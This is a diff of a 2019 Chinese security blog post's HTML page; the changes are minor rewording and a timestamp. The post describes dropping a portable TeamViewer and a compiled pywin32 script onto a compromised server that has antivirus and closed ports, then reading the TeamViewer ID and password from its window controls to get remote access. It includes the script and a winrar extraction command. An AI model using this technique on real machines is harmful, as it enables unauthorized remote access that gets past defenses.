@@ -6,21 +6,21 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="在一次测试中，我发现目标服务器挂着360tray、360bdoctor以及360EntClient等众多查杀软件，导致我的rat十分不稳定，且目标关闭了445、3389等端口，以及安装KB2871997补丁,使我十分懊恼。  后来借鉴了前辈的teamview思路，成功突破难题 通过运行teamview ,使用win32api查找句柄的方式获取窗口对话框的文本Edit 获取对应的ID、密码，这里为了">
+    <meta name="description" content="在一次测试中，我发现目标服务器挂着360tray、360bdoctor以及360EntClient等众多查杀软件，导致我的rat十分不稳定，且目标关闭了445、3389等端口，以及安装KB2871997补丁,使我十分懊恼。  后来借鉴了前辈的teamview思路，成功突破难题 通过运行teamview ,使用win32api查找句柄的方式获取窗口对话框的文本Edit 获取对应的ID、密码，为了很好">
 <meta property="og:type" content="article">
 <meta property="og:title" content="通过Teamviewer突破目标系统防御">
 <meta property="og:url" content="http://yoursite.com/2019/07/21/TvGetpass/index.html">
 <meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="在一次测试中，我发现目标服务器挂着360tray、360bdoctor以及360EntClient等众多查杀软件，导致我的rat十分不稳定，且目标关闭了445、3389等端口，以及安装KB2871997补丁,使我十分懊恼。  后来借鉴了前辈的teamview思路，成功突破难题 通过运行teamview ,使用win32api查找句柄的方式获取窗口对话框的文本Edit 获取对应的ID、密码，这里为了">
+<meta property="og:description" content="在一次测试中，我发现目标服务器挂着360tray、360bdoctor以及360EntClient等众多查杀软件，导致我的rat十分不稳定，且目标关闭了445、3389等端口，以及安装KB2871997补丁,使我十分懊恼。  后来借鉴了前辈的teamview思路，成功突破难题 通过运行teamview ,使用win32api查找句柄的方式获取窗口对话框的文本Edit 获取对应的ID、密码，为了很好">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d34186190144e185987e409">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d341948a372597c751e557b">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d34189ca372597c751e54a4">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d34188328011f3c534e0511">
-<meta property="og:updated_time" content="2019-07-21T07:57:37.000Z">
+<meta property="og:updated_time" content="2019-07-21T14:09:28.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="通过Teamviewer突破目标系统防御">
-<meta name="twitter:description" content="在一次测试中，我发现目标服务器挂着360tray、360bdoctor以及360EntClient等众多查杀软件，导致我的rat十分不稳定，且目标关闭了445、3389等端口，以及安装KB2871997补丁,使我十分懊恼。  后来借鉴了前辈的teamview思路，成功突破难题 通过运行teamview ,使用win32api查找句柄的方式获取窗口对话框的文本Edit 获取对应的ID、密码，这里为了">
+<meta name="twitter:description" content="在一次测试中，我发现目标服务器挂着360tray、360bdoctor以及360EntClient等众多查杀软件，导致我的rat十分不稳定，且目标关闭了445、3389等端口，以及安装KB2871997补丁,使我十分懊恼。  后来借鉴了前辈的teamview思路，成功突破难题 通过运行teamview ,使用win32api查找句柄的方式获取窗口对话框的文本Edit 获取对应的ID、密码，为了很好">
 <meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5d34186190144e185987e409">
     
     
@@ -144,11 +144,11 @@
     <p>在一次测试中，我发现目标服务器挂着360tray、360bdoctor以及360EntClient等众多查杀软件，导致我的rat十分不稳定，且目标关闭了445、3389等端口，以及安装KB2871997补丁,使我十分懊恼。</p>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5d34186190144e185987e409" alt=""></p>
 <p>后来借鉴了前辈的teamview思路，成功突破难题</p>
-<p>通过运行teamview ,使用win32api查找句柄的方式获取窗口对话框的文本Edit 获取对应的ID、密码，这里为了很好兼容所有版本,直接遍历所有控件的内容。</p>
+<p>通过运行teamview ,使用win32api查找句柄的方式获取窗口对话框的文本Edit 获取对应的ID、密码，为了很好兼容所有版本,我直接遍历所有控件的内容。</p>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5d341948a372597c751e557b" alt=""></p>
-<p>这里我使用python实现查询:</p>
+<p>使用pywin32查找对应的句柄:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import win32gui as gui</span><br><span class="line">import win32con,win32gui</span><br><span class="line"></span><br><span class="line">def findwindow(pHandle):</span><br><span class="line">    handle=None</span><br><span class="line">    while handle!=0:</span><br><span class="line">        handle=gui.FindWindowEx(pHandle,handle,None,None)        </span><br><span class="line">        if handle!=0:</span><br><span class="line">            findwindow(handle)</span><br><span class="line">            buffer = &apos;0&apos; * 17</span><br><span class="line">            len = win32gui.SendMessage(handle, win32con.WM_GETTEXTLENGTH) + 1</span><br><span class="line">            win32gui.SendMessage(handle, win32con.WM_GETTEXT, len, buffer)</span><br><span class="line">            print buffer[:len]</span><br><span class="line">findwindow(gui.FindWindow(None,&apos;TeamViewer&apos;))</span><br></pre></td></tr></table></figure>
-<p>这里将Teamview 单文件，以及编译后的脚本压缩丢入服务器中并使用命令行进行解压:</p>
+<p>将Teamview 单文件，以及编译后的脚本压缩丢入服务器中并使用命令行进行解压:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start winrar x team.zip F:\</span><br></pre></td></tr></table></figure>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5d34189ca372597c751e54a4" alt=""></p>
 <p>最终效果，成功获取到对方teamview ID 登录密码。</p>
